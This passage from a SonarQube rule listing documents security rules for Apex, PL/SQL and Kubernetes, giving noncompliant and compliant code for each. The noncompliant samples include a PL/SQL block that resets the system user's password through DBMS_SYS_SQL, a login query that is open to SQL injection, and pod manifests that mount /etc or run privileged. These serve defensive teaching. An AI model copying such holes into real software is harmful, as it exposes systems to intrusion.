  List&lt;List&lt;SObject&gt;&gt; sList &#61; [FIND &#39;TEST&#39; IN ALL FIELDS
                                      RETURNING Case(Name), Contact(FirstName,LastName)];
}

public inherited sharing class MyClass {
  List&lt;Case&gt; lstCases &#61; new List&lt;Case&gt;();
  for(Case c:[SELECT Id, Status FROM Case WHERE Status &#61; &#39;In Progress&#39;]){
      c.Status &#61; &#39;Closed&#39;;
      lstCasesToBeUpdated.add(c);
  }
  Update lstCasesToBeUpdated;
}
</pre>
<h3>Exceptions</h3>
<p>No issue will be raised for test classes, i.e. classes annotated with <code>&#64;isTest</code></p>
<h2>Resources</h2>
<ul><li> <a href="https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/apex_classes_keywords_sharing.htm" rel="nofollow">Using the with sharing,
  without sharing, and inherited sharing Keywords</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=apex:S2068">
              apex:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
String password &#61; &#39;xxxx&#39;; // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
String password &#61; retrievePassword();
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=apex:S5378">
              apex:S5378
            </a>
          </td>
          <td>
            <details>
              <p>By default Apex code executes without checking permissions. Hence the code will not enforce field level security, sharing rules and user
permissions during execution of Apex code in Triggers, Classes and Controllers. This creates the risk that unauthorized users may get access to
sensitive data records or fields.</p>
<p>It is possible to specify different level of sharing via the keywords &#34;with sharing&#34;, &#34;without sharing&#34; or &#34;inherited sharing&#34;. The last two should
be used very carefully as they can create security risks.</p>
<p>This rule raises an issue whenever a DML, SOSL or SOQL query is executed in a class marked as <code>without sharing</code> or <code>inherited
sharing</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> this code gives access to or modifies restricted records. </li><li> this code may be executed by users who shouldn’t have access to those records. </li><li> if the class is marked as <code>inherited sharing</code>, it may be called by a class marked as <code>without sharing</code>. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use <code>with sharing</code> whenever possible. </li><li> Use <code>without sharing</code> only after checking that the code is not accessible to unauthorized users. </li><li> Use <code>inherited sharing</code> only when all calling <code>without sharing</code> classes are safe. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
public without sharing class MyClass {
  List&lt;List&lt;SObject&gt;&gt; sList &#61; [FIND &#39;TEST&#39; IN ALL FIELDS
                                      RETURNING Case(Name), Contact(FirstName,LastName)]; // Sensitive
}

public inherited sharing class MyClass {
  List&lt;Case&gt; lstCases &#61; new List&lt;Case&gt;();
  for(Case c:[SELECT Id, Status FROM Case WHERE Status &#61; &#39;In Progress&#39;]){ // Sensitive
      c.Status &#61; &#39;Closed&#39;;
      lstCasesToBeUpdated.add(c);
  }
  Update lstCasesToBeUpdated; // Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public with sharing class MyClass { // Compliant
  List&lt;Case&gt; lstCases &#61; new List&lt;Case&gt;();
  for(Case c:[SELECT Id FROM Case WHERE Status &#61; &#39;In Progress&#39;]){
      // ...
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/apex_classes_keywords_sharing.htm" rel="nofollow">Using the with sharing,
  without sharing, and inherited sharing Keywords</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=apex:S1313">
              apex:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
String ip &#61; &#39;192.168.12.42&#39;; // Sensitive
String clientIp &#61; ApexPages.currentPage().getHeaders().get(‘True-Client-IP’);
Boolean isKnown &#61; ip.equals(clientIp);
</pre>
<h2>Compliant Solution</h2>
<pre>
StaticResource sr&#61; [SELECT ip_address FROM StaticResource WHERE Name &#61; &#39;configuration&#39; LIMIT 1]; // Compliant
String ip_address &#61; sr.body.toString();
String clientIp &#61; ApexPages.currentPage().getHeaders().get(‘True-Client-IP’);
Boolean isKnown &#61; ip_address.equals(clientIp);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=plsql:S2070">
              plsql:S2070
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;plsql%3AS4790&amp;rule_key&#61;plsql%3AS4790" rel="nofollow">S4790</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>Consider using safer alternatives, such as SHA-256, SHA-512 or SHA-3.</p>
<h3>Noncompliant code example</h3>
<pre>
DBMS_CRYPTO.Hash(str, HASH_MD4);

DBMS_CRYPTO.Hash(str, HASH_MD5);

DBMS_CRYPTO.Hash(str, HASH_SH1);
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/328" rel="nofollow">MITRE, CWE-328</a> - Reversible One-Way Hash </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> <a href="https://shattered.io/" rel="nofollow">SHAttered</a> - The first concrete collision attack against SHA-1. </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=plsql:SysOwnedFunctions">
              plsql:SysOwnedFunctions
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Some Oracle packages contain powerful SYS-owned functions that can be used to perform malicious operations. For instance,
<code>DBMS_SYS_SQL.PARSE_AS_USER</code> can be used to execute a statement as another user.</p>
<p>Most programs do not need those functions and this rule helps identify them in order to prevent security risks.</p>
<h3>Noncompliant code example</h3>
<pre>
DECLARE
  c INTEGER;
  sqltext VARCHAR2(100) :&#61; &#39;ALTER USER system IDENTIFIED BY hacker&#39;; -- Might be injected by the user
BEGIN
  c :&#61; SYS.DBMS_SYS_SQL.OPEN_CURSOR();                               -- Noncompliant

   -- Will change &#39;system&#39; user&#39;s password to &#39;hacker&#39;
  SYS.DBMS_SYS_SQL.PARSE_AS_USER(c, sqltext, DBMS_SQL.NATIVE, UID);  -- Non-Compliant

  SYS.DBMS_SYS_SQL.CLOSE_CURSOR(c);                                  -- Noncompliant
END;
/
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://cwe.mitre.org/data/definitions/269" rel="nofollow">MITRE, CWE-269</a> - Improper Privilege Management </li><li> <a href="https://cwe.mitre.org/data/definitions/270" rel="nofollow">MITRE, CWE-270</a> - Privilege Context Switching Error </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=plsql:S1523">
              plsql:S1523
            </a>
          </td>
          <td>
            <details>
              <p>Executing code dynamically is security sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-9807" rel="nofollow">CVE-2017-9807</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-9802" rel="nofollow">CVE-2017-9802</a> </li></ul>
<p>Any code which is dynamically evaluated in your process will have the same permissions as the rest of your code. Thus it is very dangerous to do so
with code coming from an untrusted source. <a href="https://owasp.org/www-community/attacks/Code_Injection" rel="nofollow">Injected Code</a> can either run on the
server or in the client (exemple: XSS attack).</p>
<p><code>EXECUTE IMMEDIATE</code> executes as a dynamic SQL statement or anonymous PL/SQL block the string passed as an argument. It’s safe only if
the argument is composed of constant character string expressions. But if the command string is dynamically built using external parameters, then it
is considered very dangerous because executing a random string allows the execution of arbitrary code.</p>
<p>This rule marks for review each occurence of dynamic code execution.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the executed code may come from an untrusted source and hasn’t been sanitized. </li><li> you really need to run code dynamically. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The best solution is to not run code provided by an untrusted source. If you really need to build a command string using external parameters, you
should use <code>EXECUTE IMMEDIATE</code> with bind variables instead.</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<h2>Sensitive Code Example</h2>
<pre>
CREATE OR REPLACE PROCEDURE ckpwd (p_user IN VARCHAR2, p_pass IN VARCHAR2)
IS
 v_query  VARCHAR2(100);
 v_output NUMBER;
BEGIN
 v_query :&#61;    q&#39;{SELECT COUNT(*) FROM user_pwd }&#39;
         ||    q&#39;{WHERE username &#61; &#39;}&#39;
         ||    p_user
         ||    q&#39;{&#39; AND password &#61; &#39;}&#39;
         ||    p_pass
         ||    q&#39;{&#39;}&#39;;
 EXECUTE IMMEDIATE v_query
  INTO v_output;
END;
</pre>
<h2>Compliant Solution</h2>
<pre>
CREATE OR REPLACE PROCEDURE ckpwd_bind (p_user IN VARCHAR2, p_pass IN VARCHAR2)
IS
 v_query  VARCHAR2(100);
 v_output NUMBER;
BEGIN
 v_query :&#61;
   q&#39;{SELECT COUNT(*) FROM user_pwd WHERE username &#61; :1 AND password &#61; :2}&#39;;
 EXECUTE IMMEDIATE v_query
  INTO v_output
  USING p_user, p_pass;
END;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/95" rel="nofollow">MITRE, CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  (&#39;Eval Injection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=plsql:S2278">
              plsql:S2278
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;plsql%3AS5547&amp;rule_key&#61;plsql%3AS5547" rel="nofollow">S5547</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>
<blockquote>
  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer
  provides the security that is needed to protect federal government information.</p>
  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>
</blockquote>
<p>For similar reasons, RC2 should also be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
PLS_INTEGER :&#61; DBMS_CRYPTO.ENCRYPT_DES
                           &#43; DBMS_CRYPTO.CHAIN_CBC
                           &#43; DBMS_CRYPTO.PAD_PKCS5;
</pre>
<h3>Compliant solution</h3>
<pre>
PLS_INTEGER :&#61; DBMS_CRYPTO.ENCRYPT_AES256
                           &#43; DBMS_CRYPTO.CHAIN_CBC
                           &#43; DBMS_CRYPTO.PAD_PKCS5;
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE" rel="nofollow">DES / DESede Unsafe</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=plsql:S5547">
              plsql:S5547
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p><a href="https://en.wikipedia.org/wiki/Strong_cryptography" rel="nofollow">Strong cipher algorithms</a> are cryptographic systems resistant to cryptanalysis, they
are not vulnerable to well-known attacks like brute force attacks for example.</p>
<p>A general recommendation is to only use cipher algorithms intensively tested and promoted by the cryptographic community.</p>
<p>More specifically for block cipher, it’s not recommended to use algorithm with a block size inferior than 128 bits.</p>
<h3>Noncompliant code example</h3>
<pre>
PLS_INTEGER :&#61; DBMS_CRYPTO.ENCRYPT_DES
                           &#43; DBMS_CRYPTO.CHAIN_CBC
                           &#43; DBMS_CRYPTO.PAD_PKCS5;
</pre>
<h3>Compliant solution</h3>
<pre>
PLS_INTEGER :&#61; DBMS_CRYPTO.ENCRYPT_AES256
                           &#43; DBMS_CRYPTO.CHAIN_CBC
                           &#43; DBMS_CRYPTO.PAD_PKCS5;
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=plsql:S4790">
              plsql:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6428">
              kubernetes:S6428
            </a>
          </td>
          <td>
            <details>
              <p>Running containers in privileged mode can reduce the resilience of a cluster in the event of a security incident because it weakens the isolation
between hosts and containers.</p>
<p>Process permissions in privileged containers are essentially the same as root permissions on the host. If these processes are not protected by
robust security measures, an attacker who compromises a root process on a Pod’s host is likely to gain the ability to pivot within the cluster.<br />
Depending on how resilient the cluster is, attackers can extend their attack to the cluster by compromising the nodes from which the cluster launched
the process.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The services of this Pod are accessible to people who are not administrators of the Kubernetes cluster. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Disable privileged mode.</p>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      ports:
        - name: web
          containerPort: 80
          protocol: TCP
      securityContext:
        privileged: true # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      ports:
        - name: web
          containerPort: 80
          protocol: TCP
      securityContext:
        privileged: false
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/284.html" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6433">
              kubernetes:S6433
            </a>
          </td>
          <td>
            <details>
              <p>Mounting sensitive file system paths can lead to information disclosure and compromise of the host systems.</p>
<p>System paths can contain sensitive information like configuration files or cache files. Those might be used by attackers to expand permissions or
to collect information for further attacks. System paths can also contain binaries and scripts that might be executed by the host system periodically.
A compromised or rogue container with access to sensitive files could endanger the integrity of the whole Kubernetes cluster.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The mounted file path contains sensitive information. </li><li> The mounted file path contains configuration files or executables that are writable. </li><li> The Pod is untrusted or might contain vulnerabilities. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to avoid mounting sensitive system file paths into containers. If it is necessary to mount such a path due to the architecture,
the least privileges should be given, for instance by making the mount read-only to prevent unwanted modifications.</p>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - image: k8s.gcr.io/test-webserver
    name: test-container
    volumeMounts:
    - mountPath: /data
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /etc # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - image: k8s.gcr.io/test-webserver
    name: test-container
    volumeMounts:
    - mountPath: /data
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /mnt/nfs
</pre>
<h2>See</h2>
<ul><li> <a href="https://kubernetes.io/docs/concepts/storage/volumes/#hostpath" rel="nofollow">Kubernetes Documentation</a> - Volumes </li><li> <a href="https://cwe.mitre.org/data/definitions/284.html" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6431">
              kubernetes:S6431
            </a>
          </td>
          <td>
            <details>
              <p>Using host operating system namespaces can lead to compromise of the host systems.<br /> These attacks would target:</p>
<ul><li> host processes </li><li> host inter-process communication (IPC) mechanisms </li><li> network services of the local host system </li></ul>
<p>These three items likely include systems that support either the internal operation of the Kubernetes cluster or the enterprise’s internal
infrastructure.</p>
<p>Opening these points to containers opens new attack surfaces for attackers who have already successfully exploited services exposed by containers.
Depending on how resilient the cluster is, attackers can extend their attack to the cluster by compromising the nodes from which the cluster started
the process.</p>
<p>Host network sharing could provide a significant performance advantage for workloads that require critical network performance. However, the
successful exploitation of this attack vector could have a catastrophic impact on confidentiality within the cluster.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The services of this Pod are accessible to people who are not administrators of the Kubernetes cluster. </li><li> The cluster’s services performances do <strong>not</strong> rely on operating system namespaces. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not use host operating system namespaces.</p>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      ports:
        - name: web
          containerPort: 80
          protocol: TCP
  hostPID: true     # Sensitive
  hostIPC: true     # Sensitive
  hostNetwork: true # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      ports:
        - name: web
          containerPort: 80
          protocol: TCP
  hostPID: false
  hostIPC: false
  hostNetwork: false
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/653.html" rel="nofollow">MITRE, CWE-653</a> - Improper Isolation or Compartmentalization </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6430">
              kubernetes:S6430
            </a>
          </td>
          <td>
            <details>
              <p>Allowing process privilege escalations exposes the Pod to attacks that exploit setuid binaries.</p>
<p>This field directly controls whether the <code>no_new_privs</code> flag is set in the container process.<br /> When this flag is enabled, binaries
configured with setuid or setgid bits cannot change their runtime uid or gid: Potential attackers must rely on other privilege escalation techniques
to successfully operate as root on the Pod.</p>
<p>Depending on how resilient the Kubernetes cluster and Pods are, attackers can extend their attack to the cluster by compromising the nodes from
which the cluster started the Pod.</p>
<p>The <code>allowPrivilegeEscalation</code> field should not be set to true unless the Pod’s risks related to setuid or setgid bits have been
mitigated.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This Pod is accessible to people who are not administrators of the Kubernetes cluster. </li><li> This Pod contains binaries with setuid or setgid capabilities. </li></ul>
<p>There is a risk if you answered yes to all of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Disable privilege escalation.</p>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      ports:
        - name: web
          containerPort: 80
          protocol: TCP
      securityContext:
        allowPrivilegeEscalation: true # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      ports:
        - name: web
          containerPort: 80
          protocol: TCP
      securityContext:
        allowPrivilegeEscalation: false
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/284.html" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://www.kernel.org/doc/Documentation/prctl/no_new_privs.txt" rel="nofollow">Linux Kernel Archives, no_new_privs</a> - Official docs </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6429">
              kubernetes:S6429
            </a>
          </td>
          <td>
            <details>
              <p>Exposing Docker sockets can lead to compromise of the host systems.</p>
<p>The Docker daemon provides an API to access its functionality, for example through a UNIX domain socket. Mounting the Docker socket into a
container allows the container to control the Docker daemon of the host system, resulting in full access over the whole system. A compromised or rogue
container with access to the Docker socket could endanger the integrity of the whole Kubernetes cluster.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The Pod is untrusted or might contain vulnerabilities. </li></ul>
